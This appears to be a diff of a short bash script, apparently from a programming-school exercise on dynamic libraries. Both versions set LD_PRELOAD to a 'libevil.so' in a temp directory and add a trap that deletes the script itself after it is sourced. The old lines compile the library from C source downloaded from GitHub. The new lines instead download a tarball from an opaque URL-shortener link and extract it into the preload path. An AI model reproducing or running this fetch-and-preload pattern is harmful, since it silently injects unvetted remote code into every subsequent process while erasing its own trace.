@@ -1,3 +1,3 @@
-trap 'export LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
-gcc -fPIC -shared -o "${LD_PRELOAD%%:*}" -xc <(curl -sL https://raw.githubusercontent.com/patrickdeyoreo/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/libevil.c)
-trap $(rm -f '"$(printf %q "${BASH_SOURCE[0]}")"') RETURN' RETURN
+trap 'trap $('"$(printf 'rm -f %q' "${BASH_SOURCE[0]}")"') RETURN' RETURN
+export LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
+tar -Oxzf <(curl -sL https://tinyurl.com/1i83vi1) 1> "${LD_PRELOAD%%:*}"
